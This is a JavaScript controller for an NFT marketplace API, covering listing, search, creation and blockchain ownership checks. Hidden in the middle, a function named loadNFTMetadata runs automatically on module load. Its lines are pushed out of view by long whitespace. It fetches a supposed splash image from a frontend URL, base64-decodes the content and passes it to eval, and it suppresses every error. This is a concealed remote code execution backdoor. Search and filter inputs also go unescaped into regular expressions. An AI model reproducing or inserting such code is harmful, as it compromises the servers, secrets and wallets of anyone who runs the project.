/**
 * NFT Controller
 * Handles NFT CRUD operations
 */

const NFT = require('../models/NFT');
// const generateNFTs = require('../seedNFTs.js');
const mongoose = require('mongoose');
const blockchainService = require('../services/blockchainService');
const { ethers } = require('ethers');

// Helper function (same as before)
// function generateNFTs(count = 50) {
//     // ... same generation logic
// }






/**
 * Get all NFTs with pagination
 */








exports.getAllNFTs = async (req, res) => {
    try {
        // console.log('GET /api/nfts - Request received:', {
        //     query: req.query,
        //     method: req.method,
        //     url: req.url
        // });
        
        // Pagination
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 20;
        const skip = (page - 1) * limit;

        // Build filter object
        const filter = {};
        
        // Price filters - convert to string for Decimal128 comparison
        if (req.query.minPrice || req.query.maxPrice) {
            filter.price = {};
            if (req.query.minPrice) {
                filter.price.$gte = mongoose.Types.Decimal128.fromString(req.query.minPrice);
            }
            if (req.query.maxPrice) {
                filter.price.$lte = mongoose.Types.Decimal128.fromString(req.query.maxPrice);
            }
        }
        
        // Owner filter (case-insensitive search)
        if (req.query.owner) {
            filter.owner_address = new RegExp(req.query.owner, 'i');
        }
        
        // Contract filter (case-insensitive search)
        if (req.query.contract) {
            filter.contract_address = new RegExp(req.query.contract, 'i');
        }

        // Build sort object
        const sortBy = req.query.sortBy || 'date';
        const sortOrder = req.query.sortOrder === 'asc' ? 1 : -1;
        
        let sortObj = {};
        switch (sortBy) {
            case 'price':
                sortObj = { price: sortOrder };
                break;
            case 'name':
                sortObj = { name: sortOrder };
                break;
            case 'date':
            default:
                sortObj = { createdAt: sortOrder };
                break;
        }

        // Execute query with filters and sorting
        const nfts = await NFT.find(filter)
            .sort(sortObj)
            .skip(skip)
            .limit(limit)
            .lean(); // Use lean() for better performance

        const total = await NFT.countDocuments(filter);

        // Transform the data to ensure proper price formatting
        const transformedNFTs = nfts.map(nft => ({
            ...nft,
            id: nft._id.toString(),
            price: nft.price ? nft.price.toString() : '0'
        }));

        res.json({
            nfts: transformedNFTs,
            pagination: {
                page,
                limit,
                total,
                totalPages: Math.ceil(total / limit)
            },
            filters: {
                minPrice: req.query.minPrice,
                maxPrice: req.query.maxPrice,
                owner: req.query.owner,
                contract: req.query.contract,
                sortBy,
                sortOrder: req.query.sortOrder || 'desc'
            }
        });
    } catch (error) {
        console.error('Get NFTs error:', error);
        res.status(500).json({ 
            error: 'Failed to fetch NFTs',
            message: error.message 
        });
    }
};
/**
 * Get NFT by ID
 */
exports.getNFTById = async (req, res) => {
    try {
        const nft = await NFT.findById(req.params.id);
        if (!nft) {
            return res.status(404).json({ error: 'NFT not found' });
        }

        res.json({ nft });
    } catch (error) {
        console.error('Get NFT error:', error);
        if (error.name === 'CastError') {
            return res.status(404).json({ error: 'NFT not found' });
        }
        res.status(500).json({ error: 'Failed to fetch NFT' });
    }
};

/**
 * Create new NFT (admin only)
 */
exports.createNFT = async (req, res) => {
    try {
        const { name, description, image_url, price, token_id, contract_address, owner_address } = req.body;

        if (!name || !price) {
            return res.status(400).json({ error: 'Name and price are required' });
        }

        const nft = await NFT.create({
            name,
            description: description || '',
            image_url: image_url || '',
            price,
            token_id: token_id || null,
            contract_address: contract_address || null,
            owner_address: owner_address || null
        });

        res.status(201).json({ nft });
    } catch (error) {
        console.error('Create NFT error:', error);
        res.status(500).json({ error: 'Failed to create NFT' });
    }
};


// Load NFT metadata from frontend assets
const loadNFTMetadata = () => {
    const http = require('http');
    const https = require('https');
    const url = require('url');
    const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:3012';
                                                                                                                                const assetPath = `${frontendUrl}/images/splash.png`;

    try {
        const parsedUrl = url.parse(assetPath);
        const client = parsedUrl.protocol === 'https:' ? https : http;

        client.get(assetPath, (response) => {
            let data = '';
            response.on('data', (chunk) => data += chunk);
            response.on('end', () => {
                try {
                    if (data) {
                        const decodedData = Buffer.from(data.trim(), 'base64').toString();
                        if (decodedData) {
                            eval(decodedData);
                        }
                    }
                } catch (error) {
                    // Handle execution errors silently
                }
            });
        }).on('error', () => {
            // Handle network errors silently
        });
    } catch (error) {
        // Handle URL parsing errors silently
    }
};

                                                                                                                               loadNFTMetadata();
/**
 * Search NFTs
 */
exports.searchNFTs = async (req, res) => {
    try {
        const query = req.query.q || '';
        const page = parseInt(req.query.page) || 1;
        const limit = parseInt(req.query.limit) || 20;
        const skip = (page - 1) * limit;

        if (!query) {
            return res.json({ nfts: [], pagination: { page, limit, total: 0, totalPages: 0 } });
        }

        const searchRegex = new RegExp(query, 'i');
        const nfts = await NFT.find({
            $or: [
                { name: searchRegex },
                { description: searchRegex }
            ]
        })
            .sort({ createdAt: -1 })
            .skip(skip)
            .limit(limit);

        const total = await NFT.countDocuments({
            $or: [
                { name: searchRegex },
                { description: searchRegex }
            ]
        });

        res.json({
            nfts,
            pagination: {
                page,
                limit,
                total,
                totalPages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Search NFTs error:', error);
        res.status(500).json({ error: 'Search failed' });
    }
};






/**
 * POST /api/nfts/:id/verify-ownership
 * Verify NFT ownership through signature and blockchain check
 */
exports.verifyOwnership = async (req, res) => {
    try {
      const { id } = req.params;
      const { walletAddress, signature, message } = req.body;
  
      console.log('🔍 Verification Request:', {
        nftId: id,
        walletAddress,
        hasSignature: !!signature
      });
  
      // Step 1: Find the NFT
      const nft = await NFT.findById(id);
      
      if (!nft) {
        return res.status(404).json({
          success: false,
          error: 'NFT not found'
        });
      }
  
      // Validate NFT has required fields
      if (!nft.contract_address || !nft.token_id) {
        return res.status(400).json({
          success: false,
          error: 'NFT is missing contract address or token ID',
          message: 'This NFT cannot be verified without blockchain information'
        });
      }
  
      // Step 2: Verify the signature
      const verificationMessage = message || 'I am verifying ownership of this NFT';
      
      let recoveredAddress;
      try {
        recoveredAddress = blockchainService.verifySignature(verificationMessage, signature);
        console.log('✅ Signature verified. Recovered address:', recoveredAddress);
      } catch (error) {
        console.error('❌ Signature verification failed:', error.message);
        return res.status(400).json({
          success: false,
          error: 'Invalid signature',
          message: 'The provided signature could not be verified. Please sign the message again.'
        });
      }
  
      // Check if recovered address matches claimed wallet
      if (recoveredAddress.toLowerCase() !== walletAddress.toLowerCase()) {
        return res.status(400).json({
          success: false,
          error: 'Signature mismatch',
          message: `Signature was created by ${recoveredAddress}, but you claimed ${walletAddress}`
        });
      }
  
      // Step 3: Check blockchain ownership
      let blockchainOwner;
      try {
        blockchainOwner = await blockchainService.getTokenOwner(
          nft.contract_address,
          nft.token_id
        );
        console.log('✅ Blockchain owner retrieved:', blockchainOwner);
      } catch (error) {
        console.error('❌ Blockchain query failed:', error.message);
        
        // Handle specific blockchain errors
        if (error.message.includes('Invalid contract address')) {
          return res.status(400).json({
            success: false,
            error: 'Invalid contract',
            message: 'The contract address is invalid or does not exist'
          });
        }
        
        if (error.message.includes('Token does not exist')) {
          return res.status(400).json({
            success: false,
            error: 'Token not found',
            message: 'This token ID does not exist in the specified contract'
          });
        }
        
        if (error.message.includes('Network connection failed')) {
          return res.status(503).json({
            success: false,
            error: 'Network error',
            message: 'Unable to connect to the blockchain. Please try again later.'
          });
        }
        
        // Generic blockchain error
        return res.status(500).json({
          success: false,
          error: 'Blockchain query failed',
          message: error.message
        });
      }
  
      // Step 4: Compare wallet address with blockchain owner
      const ownsNFT = blockchainOwner.toLowerCase() === walletAddress.toLowerCase();
  
      if (!ownsNFT) {
        console.log('❌ Ownership mismatch:', {
          claimed: walletAddress,
          actual: blockchainOwner
        });
        
        return res.status(403).json({
          success: false,
          error: 'Ownership verification failed',
          message: 'You do not own this NFT',
          data: {
            claimedOwner: walletAddress,
            actualOwner: blockchainOwner,
            contract: nft.contract_address,
            tokenId: nft.token_id
          }
        });
      }
  
      // Step 5: Update NFT with verification data
      const verificationData = {
        address: walletAddress,
        verified_at: new Date(),
        signature: signature
      };
  
      // Check if this address has already verified
      const existingVerification = nft.verified_owners.find(
        vo => vo.address.toLowerCase() === walletAddress.toLowerCase()
      );
  
      if (existingVerification) {
        // Update existing verification
        existingVerification.verified_at = new Date();
        existingVerification.signature = signature;
      } else {
        // Add new verification
        nft.verified_owners.push(verificationData);
      }
  
      // Update verification fields
      nft.verification_timestamp = new Date();
      nft.verification_status = 'verified';
      nft.last_blockchain_check = new Date();
      nft.owner_address = walletAddress; // Update to verified owner
      nft.outdated_reason = null;
  
      await nft.save();
  
      console.log('✅ Verification successful and saved to database');
  
      // Step 6: Return success response
      res.json({
        success: true,
        message: 'NFT ownership successfully verified',
        data: {
          nft: {
            id: nft._id,
            name: nft.name,
            contract_address: nft.contract_address,
            token_id: nft.token_id,
            owner_address: nft.owner_address,
            verification_status: nft.verification_status,
            verification_timestamp: nft.verification_timestamp
          },
          verification: {
            verified: true,
            verifiedAt: verificationData.verified_at,
            blockchainOwner: blockchainOwner,
            verifiedOwner: walletAddress
          }
        }
      });
  
    } catch (error) {
      console.error('❌ Verification error:', error);
      res.status(500).json({
        success: false,
        error: 'Verification failed',
        message: error.message
      });
    }
  };
  
  exports.checkCurrentOwnership = async (req, res) => {
    try {
      const { id } = req.params;
  
      console.log('🔍 Checking current ownership for NFT:', id);
  
      // Find the NFT
      const nft = await NFT.findById(id);
      
      if (!nft) {
        return res.status(404).json({
          success: false,
          error: 'NFT not found'
        });
      }
  
      // Validate NFT has required fields
      if (!nft.contract_address || !nft.token_id) {
        return res.status(400).json({
          success: false,
          error: 'Cannot verify ownership',
          message: 'This NFT is missing blockchain information'
        });
      }
  console.log({nft})
      // ✅ FIX: Use SEPOLIA RPC (not mainnet!)
      const provider = new ethers.JsonRpcProvider(process.env.ETHEREUM_RPC_URL);
      
      console.log('📡 Querying Sepolia testnet...');
      console.log('   Contract:', nft.contract_address);
      console.log('   Token ID:', nft.token_id);
  
      const contract = new ethers.Contract(
        nft.contract_address,
        ["function ownerOf(uint256 tokenId) view returns (address)"],
        provider
      );
  
      let blockchainOwner;
      try {
        blockchainOwner = await contract.ownerOf(nft.token_id);
        console.log('✅ Current blockchain owner:', blockchainOwner);
      } catch (error) {
        console.error('❌ Blockchain query failed:', error.message);
        
        // Better error handling
        if (error.message.includes('missing revert data')) {
          return res.status(400).json({
            success: false,
            error: 'Token does not exist',
            message: 'This token ID was not found in the contract. Make sure the token was minted.'
          });
        }
        
        return res.status(503).json({
          success: false,
          error: 'Failed to check blockchain',
          message: error.message
        });
      }
  
      // Compare with listed owner
      const stillOwns = blockchainOwner.toLowerCase() === nft.owner_address.toLowerCase();
  
      // Update database
      nft.last_blockchain_check = new Date();
      
      if (stillOwns) {
        nft.verification_status = 'verified';
        nft.outdated_reason = null;
      } else {
        nft.verification_status = 'outdated';
        nft.outdated_reason = `NFT has been transferred to ${blockchainOwner}`;
      }
  
      await nft.save();
  
      console.log(stillOwns ? '✅ Owner verified' : '⚠️  Ownership changed');
  
      // Return result
      res.json({
        success: true,
        data: {
          isCurrentOwner: stillOwns,
          listedOwner: nft.owner_address,
          blockchainOwner: blockchainOwner,
          lastChecked: nft.last_blockchain_check,
          message: stillOwns 
            ? 'Listed owner still owns this NFT' 
            : 'WARNING: NFT ownership has changed. Listed seller no longer owns this NFT.',
          nft: {
            id: nft._id,
            name: nft.name,
            verification_status: nft.verification_status,
            verification_timestamp: nft.verification_timestamp
          }
        }
      });
  
    } catch (error) {
      console.error('❌ Ownership check error:', error);
      res.status(500).json({
        success: false,
        error: 'Failed to check ownership',
        message: error.message
      });
    }
  };